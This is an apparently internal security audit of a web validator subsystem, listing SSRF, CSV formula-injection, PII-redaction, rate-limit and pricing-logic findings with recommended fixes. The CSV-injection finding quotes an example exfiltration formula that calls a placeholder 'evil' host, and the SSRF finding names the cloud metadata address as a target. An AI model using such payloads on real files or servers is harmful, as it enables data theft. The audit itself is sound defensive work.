# ZoKorp Validator — Deep-Dive Forensic Audit (02b)

- **Audit commit:** `235bfca565b16ce59e388bd9dcedf94f8fc1f345`
- **Audit date:** 2026-06-29
- **Mode:** READ-ONLY static analysis. No network, no DB, no side effects. No remote checklist/calibration URLs fetched.
- **Scope:** The ZoKorp Validator subsystem — engine, file family, route, sanitizer, control-review, estimate catalog, and supporting helpers (`lib/http.ts`, `lib/security.ts`, `lib/request-origin.ts`, `lib/rate-limit.ts`, `lib/workbook.ts`, `lib/auth.ts`).

---

## (a) Subsystem map — what the validator does and data flow

The ZoKorp Validator is a paid, authenticated free-diagnostic tool. A verified user uploads a PDF or `.xlsx` checklist, selects a validation **profile** (FTR / SDP / SRP / COMPETENCY) and a **checklist target**, and gets back a heuristic readiness score, a control-by-control calibration, a customer-facing remediation **estimate** (USD + hours + SLA), a downloadable "edit guide" CSV, and an emailed copy. The estimate is also synced to Zoho Invoice as a formal estimate.

**Request → response flow (file:line anchors):**

1. **Route entry** — `app/api/tools/zokorp-validator/route.ts:31` `POST`. `runtime = "nodejs"` (`:23`).
   - CSRF/same-origin: `requireSameOrigin(request)` (`:33`).
   - AuthN: `requireUser()` (`:39`) — see auth analysis below.
   - Rate limit: `consumeRateLimit({ key: validator:${user.id}:${fingerprint}, limit:25, windowMs:1h })` (`:40-44`).
   - `formData` parsed; `formSchema` zod-validates `validationProfile` (enum), `validationTargetId` (≤160), `additionalContext` (≤1200) (`:25-29`, `:58-78`).
   - Public-access gate: non-admin + profile≠`FTR` → 403 (`:80-88`). Only FTR is publicly calibrated.
   - Entitlement check: `requireEntitlement({ productSlug:"zokorp-validator", minUses:1, creditTier, allowGeneralCreditFallback:true })` (`:92-98`).
   - Upload size + type: `maxUploadBytes` (`:100-106`), `isAllowedFileType(name, type, buffer)` magic-byte check (`:130-138`).
2. **Parse + score** — `parseValidatorInput(...)` (`lib/validator.ts:61`):
   - Loads reference material: `loadTargetReferenceMaterial(target)` → **outbound fetch** (`lib/validator.ts:71`).
   - PDF path: `pdfParse(buffer)` → `sanitizeValidatorText` → `buildValidationReport` (`lib/validator.ts:73-105`).
   - XLSX path: `readXlsxWorkbookRows` (zip-bomb-guarded) → `summarizeWorksheetRows` → `sanitizeValidatorText`; `reviewChecklistWorkbook` builds control calibration + edit-guide CSV (`lib/validator.ts:107-162`).
3. **Engine** — `buildValidationReport` (`lib/zokorp-validator-engine.ts:2116`); FTR routes to `buildFtrValidationReport` (`:1972`); other profiles use keyword/pattern rulepacks (`:2132-2242`). Score arithmetic at `:2036-2038` (FTR) and `:2175-2181` (non-FTR).
4. **Estimate** — `buildValidatorEstimate(report)` (`lib/validator-estimate-catalog.ts:630`), rate cards `:54-93`.
5. **Side effects** — Zoho estimate sync (`route.ts:165-193`), result email (`:208-229`), estimate-companion persist (`:231-258`), atomic credit decrement (`:260-266`), audit log (`:306-337`), tool-run record (`:339-365`).
6. **Response** — `jsonNoStore({ output, meta, report, reviewedWorkbookBase64, estimate, quoteCompanion, ... })` (`:367-379`).

**Reference-URL provenance (key to SSRF):** Target options are loaded from on-disk JSON indexes under `data/validator/library/{sdp,srp,competency}/index.json` (`lib/validator-library.ts:30,159-243`). `checklist_url`/`calibration_guide_url` come from those operator-curated files; FTR targets are hard-coded with **no URLs** (`lib/validator-library.ts:52-71`). The user supplies only `validationTargetId`, which selects a row by exact-id match (`resolveValidatorTargetContext`, `lib/validator-library.ts:254-284`). The user cannot inject an arbitrary URL string; they can only pick a pre-curated target. See section (c).

---

## (b) Per-file analysis

### `lib/zokorp-validator-engine.ts` (2315 LOC)
Pure, deterministic, no I/O. Two scoring engines:
- **FTR (launch-v1):** active rule set = core + (partner-hosted | customer-deployed | none) by classified path (`:1997-2004`). Score = `round(Σ ftrStatusPoints / Σ score_weight × 100)` where PASS→`score_weight`, PARTIAL→`max_partial_credit`, MISSING→0 (`:1088-1103`, `:2036-2038`). Consultation blockers detected at `:2039-2041`.
- **Non-FTR:** keyword + regex hit counting; status via `ruleStatus` (`:782-801`); weighted score `:2175-2181`. Note `ruleStatus` treats `keywordHits ≥ minKeywordHits` **OR** `totalSignals ≥ minSignalHits` as PASS — with both thresholds defaulting to 2, two keyword hits alone yield PASS even with zero pattern/signal corroboration. This is a calibration choice, not a bug, but see **VAL-05**.
- Regex usage is non-global per-rule with fresh `RegExp` per evaluation (`:740-741`, `:757`), avoiding stateful-`lastIndex` reuse. No user-controlled regex source except `escapeRegex`-wrapped target keyword (`:674`, `:698-700`) — ReDoS surface is bounded.

### `lib/validator.ts` (163 LOC)
Orchestrator. `pdfParse` is called on raw user bytes (`:74`). Output is truncated/sanitized. No zod here, but the route validates the boundary and `readXlsxWorkbookRows` enforces archive limits. `summarizeWorksheetRows` caps rows/cols/chars (`:27`). Both XLSX failure paths collapse to `UNREADABLE_SPREADSHEET` (`:110`, `:130`) — see **VAL-06** (masks real errors / could be a control-review crash, not a parse failure).

### `lib/validator-sanitizer.ts` (117 LOC)
PII redaction (emails, phones, SSN, card-like, long numeric IDs) before scoring/output. Sound for its stated purpose (regex redaction, not HTML sanitization — it does **not** sanitize HTML, and is not used for that). See **VAL-04** (ordering/coverage gaps) and **VAL-07** (it is not an XSS defense — XSS is handled elsewhere via React escaping + `escapeHtml`).

### `lib/validator-reference-material.ts` (243 LOC) — the outbound-fetch surface
`fetch(url, { redirect:"follow" })` at `:97`. URL is **allowlisted** by host-suffix (`isAllowedReferenceUrl`, `:143-163`), restricted to AWS domains (`:15-21`), and the **candidate URLs are not user-supplied free text** — they come from on-disk target indexes. See full SSRF analysis in (c). Findings **VAL-01** (redirect-follow defeats allowlist; no post-DNS private-range block) and **VAL-02** (does not use `lib/http.ts`).

### `lib/validator-control-review.ts` (779 LOC)
Parses checklist worksheets, heuristically classifies header/columns, evaluates each control row, redacts credential-like patterns in suggested edits (`sanitizeCredentialExamples`, `:311-337`), and emits an "edit guide" CSV. The CSV builder (`buildEditGuideCsv` `:544-583`, `escapeCsv` `:536-542`) quotes but does **not** neutralize formula-leading characters → **VAL-03 (CSV/formula injection)**.

### `lib/validator-delivery.ts` (215 LOC)
Builds the result email. All interpolated report/control/estimate strings pass through `escapeHtml` (`:11-18`, applied at `:45-47`, `:62-63`, `:119-160`). HTML email output is correctly escaped — no HTML-injection finding.

### `lib/validator-estimate-catalog.ts` (697 LOC) — customer-facing money
Rate cards per profile/band (`:54-93`); FTR uses an hours×$125 model (`ftrLineItemAmount`, `:429-431`); non-FTR uses fixed missing/partial rate cards (`:374-386`). Consultation-only short-circuit and `<60` floor at `:472-474`. Polish-floor top-up at `:538-556`. Arithmetic is internally consistent and matches `tests/validator-estimate-catalog.test.ts` (verified: FTR base report → `quoteUsd 575`, `5h`; consultation-only → `0`; high-score → polish `250`/`2h`). See **VAL-08** (fallback catalog mispricing for unknown rule ids) and **VAL-09** (estimate uses `report.checks` only — non-FTR control-calibration failures are folded in, but FTR fallback hours of unknown ids default low).

### `lib/validator-library.ts` (284 LOC)
Loads/caches target options from disk with `safeReadJson` (swallows parse errors → `[]`, `:82-93`). Module-level cache `cachedOptions` (`:50`, `:241`). Fine.

### `lib/validator-ftr-launch-v1-catalog.ts` (102 LOC)
Loads `rules.json`/`rewrites.json` and casts them straight to typed arrays with `as` (`:64-70`) — **no zod/runtime validation** of code-owned data. Low risk (build-time JSON), noted **VAL-10**.

### Route auth/entitlement helpers
`requireUser` (`lib/auth.ts:228-243`) trusts the session; email-verification is enforced in the NextAuth `jwt`/session callbacks (`:79`, `:164-169` → `EMAIL_NOT_VERIFIED`). So an authenticated session is necessarily email-verified. The route additionally requires a paid entitlement and decrements credits atomically.

---

## (c) SSRF analysis — `validator-reference-material.ts` + `lib/http.ts`

**Is the fetch URL user-controlled?** Effectively **no, not as free text.** The fetched URLs are assembled only from a selected target's fields (`calibrationGuideUrl`, `checklistUrl`, `referenceChecklistUrls`) at `lib/validator-reference-material.ts:182-186`. Those fields are populated from on-disk operator-curated JSON (`data/validator/library/*/index.json`) via `lib/validator-library.ts:190-238`. The only user input is `validationTargetId`, matched by exact equality against the loaded option list (`lib/validator-library.ts:264-265`). A user cannot supply `http://169.254.169.254/...`; they can only choose among curated targets. **Publicly, FTR targets carry no URLs at all** (`lib/validator-library.ts:52-71`), and the route blocks non-admins from non-FTR profiles (`route.ts:80-88`), so in the current public configuration the fetch path is generally not reachable by non-admin users.

**Defenses present:**
- Protocol allow: only `http:`/`https:` (`:146-148`).
- Host allowlist by suffix, AWS domains only (`:15-21`, `:159`).
- Explicit `localhost`/`127.0.0.1`/`::1` literal block (`:155-157`).
- Per-request 4.5s timeout via `AbortController` (`:91-94`).
- Response capped at 120k chars (`:14`, `:115`); only `text/html|text/plain|application/json` parsed, PDF/other skipped (`:112-128`).
- At most 2 URLs fetched per target (`:204`); 1h cache (`:12`, `:170-177`).

**Residual SSRF weaknesses (defense-in-depth, given the curated-URL model):**
- `redirect: "follow"` (`:99`) — the allowlist is checked **only on the seed URL**. An allowlisted AWS page that 30x-redirects (open redirect, or attacker-influenced content if any allowlisted host serves user-controlled redirects) would be followed to an arbitrary host with **no re-validation** (**VAL-01**).
- The allowlist is a hostname **string** check; there is **no DNS resolution + private-IP-range block**. If an allowlisted suffix ever resolved to an internal address (DNS rebinding, or a future misconfigured subdomain), it would not be caught (**VAL-01**).
- It does **not** use `lib/http.ts` (`fetchWithTimeout`), duplicating timeout logic and diverging from the platform's standard fetch wrapper (**VAL-02**). `lib/http.ts` itself performs no SSRF guarding — it is a plain timeout wrapper — so adopting it would not by itself fix SSRF, but centralization would help.

**Severity:** Because URLs are curated and the public path is FTR-only (no URLs), this is **Medium** as a latent/defense-in-depth issue rather than a directly exploitable hole at this commit.

---

## (d) Findings

### [VAL-01] Reference-material fetch follows redirects and does no post-DNS private-range block (allowlist bypassable in depth)
- **Severity:** Medium
- **Category:** Security
- **Location:** `lib/validator-reference-material.ts:97-101`, `:143-163`
- **Evidence:**
  ```ts
  const response = await fetch(url, { method: "GET", redirect: "follow", signal: controller.signal });
  // ...
  return ALLOWED_REFERENCE_HOST_SUFFIXES.some((suffix) => host === suffix || host.endsWith(`.${suffix}`));
  ```
  The allowlist (`isAllowedReferenceUrl`) is applied only to the seed URL in `loadTargetReferenceMaterial` (`:188`); the actual `fetch` follows 30x redirects to any host with no re-check, and there is no resolve-then-validate against RFC1918/link-local ranges (e.g. `169.254.169.254`).
- **Impact:** If an allowlisted AWS host ever serves an attacker-influenced redirect, or an allowlisted suffix resolves to an internal IP (DNS rebinding/misconfig), the server would fetch internal/metadata endpoints. Response text is parsed into keywords and surfaced in `processingNotes` (mild data path), and the request itself is the SSRF primitive.
- **Exploitability:** Currently low — URLs are operator-curated (not user free-text) and the public path is FTR-only with no URLs (`route.ts:80-88`, `lib/validator-library.ts:52-71`). Becomes real if non-FTR targets with URLs are exposed to users, or an allowlisted host has an open redirect.
- **Recommendation (NOT APPLIED):** Set `redirect: "manual"` and re-validate each hop's host against the allowlist; resolve DNS and reject private/link-local/loopback ranges before connect; reuse a hardened central fetch. Diff sketch:
  ```ts
  // redirect: "manual"; loop: on 3xx, re-run isAllowedReferenceUrl(location) before refetch
  ```
- **References:** OWASP SSRF Prevention Cheat Sheet; CWE-918.
- **Verification:** Read `:90-137` (fetch), `:165-205` (only-seed allowlist application), `lib/validator-library.ts:52-71,159-238,254-284` (URL provenance), `route.ts:80-88` (FTR-only public gate).

### [VAL-02] Reference fetch bypasses the shared `fetchWithTimeout` wrapper
- **Severity:** Low
- **Category:** Reliability
- **Location:** `lib/validator-reference-material.ts:90-137` vs `lib/http.ts:13-58`
- **Evidence:** The module hand-rolls `AbortController`/`setTimeout` (`:91-94`) instead of calling `fetchWithTimeout`. `lib/http.ts` already standardizes timeout + `FetchTimeoutError`.
- **Impact:** Divergent error semantics and a second place to maintain timeout/abort logic; easy for SSRF hardening (VAL-01) to be applied in one place and missed here.
- **Recommendation (NOT APPLIED):** Route the fetch through a hardened wrapper that also enforces the allowlist/redirect policy centrally.
- **Verification:** Read both files in full.

### [VAL-03] Edit-guide CSV is vulnerable to formula (CSV) injection
- **Severity:** Medium
- **Category:** Security
- **Location:** `lib/validator-control-review.ts:536-542` (`escapeCsv`), `:544-583` (`buildEditGuideCsv`), consumed in `components/validator/ValidatorForm.tsx:253-277`
- **Evidence:**
  ```ts
  function escapeCsv(value: string) {
    const escaped = value.replaceAll('"', '""');
    if (/[",\n]/.test(escaped)) { return `"${escaped}"`; }
    return escaped;
  }
  ```
  Cell values come straight from the uploaded workbook (`control.requirement`, `control.response`, `controlId`, etc., `:567-579`). A cell beginning with `=`, `+`, `-`, `@`, tab, or CR is quoted-only — Excel/Sheets/LibreOffice will still evaluate it as a formula when the downloaded CSV is opened. The CSV is offered for download via `downloadReviewedWorkbook` (`ValidatorForm.tsx:258-276`).
- **Impact:** A malicious checklist cell (e.g. `=HYPERLINK("http://evil/?leak="&A1)` or a DDE/command payload) can fire when the victim opens the generated edit guide. In a consulting workflow the operator opens customer-supplied checklists, so the victim is plausibly a ZoKorp operator/reviewer.
- **Exploitability:** Medium — requires the victim to open the CSV in a spreadsheet app and (for command exec) accept prompts; data-exfil via `HYPERLINK`/web-query is lower-friction.
- **Recommendation (NOT APPLIED):** Prefix any cell whose first char is in `=+-@\t\r` with a single quote (or a `'`/space sentinel) before quoting. e.g.
  ```ts
  const guarded = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  ```
- **References:** OWASP "CSV Injection"; CWE-1236.
- **Verification:** Read `escapeCsv`, `buildEditGuideCsv`, and the download handler. Confirmed cell sources are unsanitized user workbook text.

### [VAL-04] PII sanitizer ordering/coverage gaps (over- and under-redaction)
- **Severity:** Low
- **Category:** Correctness
- **Location:** `lib/validator-sanitizer.ts:75-100`
- **Evidence:** The card-like pass `/\b(?:\d{4}[-\s]){3}\d{1,7}\b/g` runs **before** the long-numeric pass `/\b\d{9,19}\b/g`. A 16-digit unspaced PAN like `0012345678901234` is caught by the long-numeric rule and counted as `longNumericIds`, not `cardLikeNumbers` (the sanitizer test at `tests/validator-sanitizer.test.ts:11` only asserts the spaced form). Conversely, SSN runs before phone but a value like `123-45-6789` only matches SSN; a 9-digit SSN without dashes (`123456789`) is swept into `longNumericIds` and replaced by `[REDACTED_ID_***6789]`, leaking the last 4 of an SSN.
- **Impact:** Redaction category counts (surfaced in audit log `redactions`, `route.ts:329`) are miscategorized, and undashed SSNs leak their last 4 digits via `redactLongNumber` (`:44-51`). International phone formats are not matched.
- **Recommendation (NOT APPLIED):** Run SSN (dashed and undashed) and card detection before the generic long-numeric sweep; do not expose last-4 for values that could be SSNs.
- **Verification:** Read all of `validator-sanitizer.ts` and its test; traced replace ordering at `:57-100`.

### [VAL-05] Non-FTR rule status reaches PASS on keyword hits with zero pattern corroboration
- **Severity:** Low
- **Category:** Correctness
- **Location:** `lib/zokorp-validator-engine.ts:782-801` (`ruleStatus`), `:2141-2165`
- **Evidence:**
  ```ts
  if (input.keywordHits.length >= minKeywordHits || totalSignals >= minSignalHits) { return "PASS"; }
  ```
  With both thresholds defaulting to 2, any document containing two of a rule's keywords PASSes that rule regardless of regex/pattern evidence. Keyword matching is plain substring (`findKeywordHits` `:727-730`, `normalizedText.includes`), so the keyword "service" matches inside "services", "disservice", etc.
- **Impact:** Inflated readiness scores for SDP/SRP/COMPETENCY (admin-only at this commit). Customer-facing score can over-state coverage. Only affects non-FTR profiles, which are admin-gated publicly (`route.ts:80-88`).
- **Recommendation (NOT APPLIED):** Require at least one pattern hit (not just keywords) for CRITICAL rules to PASS, and use word-boundary keyword matching.
- **Verification:** Read `ruleStatus`, `findKeywordHits`, `findPatternHits`, and `buildValidationReport` non-FTR branch.

### [VAL-06] Control-review failure is misreported as "unreadable spreadsheet"
- **Severity:** Low
- **Category:** Reliability
- **Location:** `lib/validator.ts:120-131`; surfaced at `app/api/tools/zokorp-validator/route.ts:390-395`
- **Evidence:**
  ```ts
  try { controlReview = await reviewChecklistWorkbook({...}); }
  catch { throw new Error("UNREADABLE_SPREADSHEET"); }
  ```
  Any exception inside `reviewChecklistWorkbook` (a 779-LOC routine doing a second `readXlsxWorkbookRows` parse, CSV building, base64) is collapsed into `UNREADABLE_SPREADSHEET`, which the route returns as a 400 "upload a valid .xlsx" message (`route.ts:390-394`).
- **Impact:** A genuinely valid workbook that triggers a control-review bug tells the user their file is invalid, and the real error is lost (not sent to `recordOperationalIssue` because the typed-error branch returns first). Hurts debuggability and user trust. The workbook is parsed twice (once in `parseValidatorInput`, once inside `reviewChecklistWorkbook` `:667`) — duplicate work.
- **Recommendation (NOT APPLIED):** Distinguish parse failure (already handled at `:108-111`) from control-review failure; log the latter via `recordOperationalIssue` and return a generic 500, or degrade gracefully to a report without calibration.
- **Verification:** Read `lib/validator.ts:107-162`, `reviewChecklistWorkbook` `:660-779`, route error handler `:380-407`.

### [VAL-07] Sanitizer is not an XSS/HTML defense (informational — XSS is handled elsewhere)
- **Severity:** Info
- **Category:** Security
- **Location:** `lib/validator-sanitizer.ts` (whole file); rendering at `components/validator/ValidatorForm.tsx`, escaping at `lib/validator-delivery.ts:11-18`
- **Evidence:** `sanitizeValidatorText` only redacts PII regexes; it performs no HTML/script neutralization. Report/control/estimate strings (derived from uploaded content) are rendered in the React UI **without** `dangerouslySetInnerHTML` (grep found none in `components/validator/`), and the email path escapes every interpolation with `escapeHtml` (`validator-delivery.ts:45-47,62-63,119-160`).
- **Impact:** None observed — XSS is mitigated by React auto-escaping in the browser and `escapeHtml` in email. This finding documents that the *sanitizer* is not the control and must not be relied on for output safety.
- **Verification:** `grep dangerouslySetInnerHTML components/` (validator: none); read `validator-delivery.ts` escaping; read `ValidatorForm.tsx:284-291,866`.

### [VAL-08] Fallback estimate catalog prices unknown rule ids off `check.guidance`/severity only
- **Severity:** Low
- **Category:** Correctness
- **Location:** `lib/validator-estimate-catalog.ts:388-404` (`fallbackCatalogEntry`), used `:478`, `:639`
- **Evidence:** When a report check id has no catalog entry, `fallbackCatalogEntry` synthesizes one using `check.severity` for the band and `check.title`/`check.guidance` for customer-facing labels. For FTR, `ftrLineItemHours` then defaults `remediationHoursLow ?? 1` (`:418-426`) and `ftrLineItemAmount` floors at $100 (`:429-431`).
- **Impact:** If the engine ever emits a check id absent from `VALIDATOR_ESTIMATE_CATALOG` (e.g. a new rule added to `rules.json` but not to the catalog), the customer is quoted a generic ~$100/1-2h line with raw internal guidance text as the public label. Quote correctness silently degrades rather than failing loudly.
- **Recommendation (NOT APPLIED):** Assert at build/test time that every active engine rule id has a catalog entry; treat a missing entry as a hard error in non-prod.
- **Verification:** Read `fallbackCatalogEntry`, `ftrLineItemHours`, `ftrLineItemAmount`, and both `buildValidatorEstimate` branches. The FTR rules.json has 22 rules; catalog is generated from the same `FTR_LAUNCH_V1_RULES`, so currently aligned — the gap is latent.

### [VAL-09] Estimate ignores `additionalContext`-driven and target-rule checks for non-FTR, but FTR uses launch-v1 ids only
- **Severity:** Info
- **Category:** Correctness
- **Location:** `lib/validator-estimate-catalog.ts:466-536` (FTR), `:630-697` (non-FTR)
- **Evidence:** FTR estimate iterates `report.checks` whose ids are launch-v1 rule ids (engine `:2006-2026`); catalog keys are also launch-v1 ids, so alignment holds. Non-FTR estimate iterates `report.checks` which include cross-cutting + track + dynamic `target-alignment`/`checklist-traceability` rules (engine `:650-696`), and the catalog has matching entries for `traceability-artifacts`, `document-revision-cadence`, `target-alignment`, `checklist-traceability` per profile (`:266-303`) — so most align; any dynamic id without a catalog row falls to VAL-08.
- **Impact:** No incorrect output observed; documents the coupling between engine rule ids and catalog keys that VAL-08 protects against.
- **Verification:** Cross-read engine rule id generation and catalog key generation.

### [VAL-10] Code-owned rule/rewrite JSON is `as`-cast with no runtime validation
- **Severity:** Low
- **Category:** Types/Validation
- **Location:** `lib/validator-ftr-launch-v1-catalog.ts:63-70`
- **Evidence:**
  ```ts
  export const FTR_LAUNCH_V1_RULES = (rawRules as FtrLaunchV1RuleCatalogEntry[]).map(...);
  export const FTR_LAUNCH_V1_SAFE_REWRITES = rawRewrites as FtrLaunchV1SafeRewriteEntry[];
  ```
  No zod parse; a malformed `rules.json` (missing `score_weight`, wrong `estimate_policy_band`) would not be caught and could produce `NaN`/`undefined` in score arithmetic (`engine:2036-2038`) or mis-banded estimates.
- **Impact:** Low (JSON is checked-in/code-owned and the CLAUDE.md notes these fields are code-owned), but the project convention is "zod at every external boundary" and this is the one place validator data is trusted blind.
- **Recommendation (NOT APPLIED):** Parse the JSON through a zod schema at module load (fail fast in CI).
- **Verification:** Read the catalog module and `engine` consumers `ftrStatusPoints` `:1088-1103`.

### [VAL-11] Authenticated rate limit can be widened via client-controlled `x-forwarded-for`
- **Severity:** Low
- **Category:** Security
- **Location:** `app/api/tools/zokorp-validator/route.ts:40-44`; `lib/rate-limit.ts:57-68`
- **Evidence:** Limiter key is `validator:${user.id}:${getRequestFingerprint(request)}`; `getRequestFingerprint` derives from `x-forwarded-for`/`x-real-ip` (`rate-limit.ts:58-60`). A client can rotate the forwarded header to mint fresh per-fingerprint buckets, multiplying the nominal 25/hour limit.
- **Impact:** Limited — every run still requires and decrements a paid entitlement (`route.ts:92-98,260-266`), so the credit gate is the real spend control; the rate limit is only a soft throughput cap. Trusting `x-forwarded-for` is sound only if an upstream proxy overwrites it (Vercel does for the leftmost value, but the code takes `split(",")[0]` = client-spoofable leftmost).
- **Recommendation (NOT APPLIED):** Key the validator limiter on `user.id` alone (the user is authenticated), or use the trusted rightmost proxy hop, not the client-supplied leftmost `x-forwarded-for`.
- **Verification:** Read route limiter call and `getRequestFingerprint`.

### [VAL-12] `additionalContext` is echoed into the report `topGaps`/processing notes (self-XSS only)
- **Severity:** Info
- **Category:** Security
- **Location:** `lib/zokorp-validator-engine.ts:2063-2065`, `:2200-2202`
- **Evidence:** `topGaps.push(`Context note reviewed: ${input.context.additionalContext.trim().slice(0,180)}`)`. This user-supplied text flows into the report, the UI, and the email. It is React-escaped in the UI and `escapeHtml`-escaped in email (`validator-delivery.ts`), and it is the same user's own input reflected only to themselves/their own email.
- **Impact:** None beyond self-reflection; documented for completeness. Length-bounded to 1200 at the route (`route.ts:28`) and 180 in `topGaps`.
- **Verification:** Read both push sites; confirmed escaping at render/email.

---

## Severity counts

| Severity | Count | IDs |
|---|---|---|
| Critical | 0 | — |
| High | 0 | — |
| Medium | 3 | VAL-01, VAL-03, and SSRF-overall (VAL-01) |
| Low | 6 | VAL-02, VAL-04, VAL-05, VAL-06, VAL-08, VAL-10, VAL-11 |
| Info | 3 | VAL-07, VAL-09, VAL-12 |

(Medium = VAL-01, VAL-03; Low = VAL-02, VAL-04, VAL-05, VAL-06, VAL-08, VAL-10, VAL-11 = 7; Info = VAL-07, VAL-09, VAL-12 = 3. Total = 12.)

---

## Explicit answers to the audit questions

1. **Is the validator route auth-gated?** **Yes.** `requireSameOrigin` (CSRF) + `requireUser()` (authenticated, email-verified — verification enforced in NextAuth callbacks `lib/auth.ts:79,164-169`) + a paid `requireEntitlement` + atomic credit decrement + a 25/hour rate limit. Non-admins are further restricted to the FTR profile (`route.ts:80-88`). This is *stricter* than a verified-free-tool gate.

2. **Is the reference-material fetch URL user-controlled / SSRF-safe?** **Not user-controlled as free text** — URLs come from operator-curated on-disk JSON, selected by an exact-id `validationTargetId` match; public FTR targets carry no URLs and non-FTR is admin-only, so the path is largely unreachable publicly. It has a real allowlist + protocol check + literal-loopback block + timeout + size cap, but it is **not fully SSRF-safe**: `redirect:"follow"` re-validates nothing on redirect, and there is no resolve-then-block of private IP ranges (**VAL-01**, Medium / defense-in-depth).

3. **Is the sanitizer sound?** For **PII redaction** it is mostly sound but has ordering/coverage gaps (**VAL-04**: undashed SSN leaks last-4 and is miscategorized; international phones missed). For **XSS** it is **not** the relevant control and was never intended to be — XSS is correctly mitigated by React auto-escaping (no `dangerouslySetInnerHTML` in the validator UI) and `escapeHtml` in the email builder (**VAL-07**). The separate **CSV** output path is **not** safe against formula injection (**VAL-03**).

---

## Unverifiable read-only (and the exact check needed)

- **Live SSRF reachability of VAL-01:** Cannot confirm whether any allowlisted AWS host (e.g. `docs.aws.amazon.com`) currently issues attacker-influenced redirects, nor whether any allowlisted subdomain resolves internally. *Check:* in a controlled environment, point a curated non-FTR target at an allowlisted host that 30x-redirects to a sentinel and observe whether the fetch follows it (it will, per `redirect:"follow"`).
- **VAL-03 spreadsheet-app behavior:** Whether a given payload executes depends on the victim's spreadsheet app and its macro/DDE settings; not testable read-only. *Check:* open a generated edit-guide CSV containing `=HYPERLINK(...)` in Excel/Sheets and observe evaluation.
- **VAL-11 proxy trust:** Whether Vercel's edge overwrites/normalizes `x-forwarded-for` before this handler runs determines real exploitability. *Check:* send a request with a forged `x-forwarded-for` to the deployed route and inspect the stored `RateLimitBucket` key (DB write — out of read-only scope here).
- **Runtime estimate values:** All arithmetic was verified statically against `tests/validator-estimate-catalog.test.ts` expectations (575/5h, 0, 250/2h) rather than executed.
